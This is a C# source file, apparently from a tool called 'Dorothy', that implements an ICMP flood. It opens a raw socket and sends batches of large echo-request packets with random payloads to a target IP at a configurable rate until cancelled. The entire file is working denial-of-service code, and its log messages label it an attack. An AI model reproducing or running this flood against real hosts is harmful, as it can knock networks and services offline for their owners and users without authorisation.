using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;

namespace Dorothy.Models
{
    public class IcmpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private Socket? _socket;

        public IcmpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting ICMP Flood attack.");

            try
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.Icmp);
                _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, false);

                byte[] icmpHeader = new byte[8];
                byte[] payload = new byte[1400];

                var random = new Random();
                // Account for IP header (20 bytes) + ICMP header (8 bytes) + payload
                int totalPacketSize = 20 + icmpHeader.Length + payload.Length;
                int batchSize = 32; // Send packets in batches for better throughput
                long packetsPerSecond = _params.BytesPerSecond / totalPacketSize;
                double microsecondsPerBatch = (1_000_000.0 * batchSize) / packetsPerSecond;

                await Task.Run(() =>
                {
                    var stopwatch = new Stopwatch();
                    var endpoint = new IPEndPoint(_params.DestinationIp, 0);
                    byte[] fullPacket = new byte[icmpHeader.Length + payload.Length];

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            stopwatch.Restart();

                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                            {
                                icmpHeader[0] = 8;  // Echo Request
                                random.NextBytes(payload);

                                Buffer.BlockCopy(icmpHeader, 0, fullPacket, 0, icmpHeader.Length);
                                Buffer.BlockCopy(payload, 0, fullPacket, icmpHeader.Length, payload.Length);

                                _socket.SendTo(fullPacket, endpoint);
                            }

                            // High precision rate limiting
                            long elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000 / Stopwatch.Frequency;
                            if (elapsedMicroseconds < microsecondsPerBatch)
                            {
                                int remainingMicroseconds = (int)(microsecondsPerBatch - elapsedMicroseconds);
                                if (remainingMicroseconds > 1000) // Only sleep for delays > 1ms
                                {
                                    Thread.Sleep(remainingMicroseconds / 1000);
                                }
                                // Spin wait for sub-millisecond precision
                                while (stopwatch.ElapsedTicks * 1_000_000 / Stopwatch.Frequency < microsecondsPerBatch)
                                {
                                    Thread.SpinWait(1);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending ICMP packet (Layer 3).");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "ICMP Flood attack failed.");
                throw;
            }
        }

        public void Dispose()
        {
            _socket?.Dispose();
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
    }
} 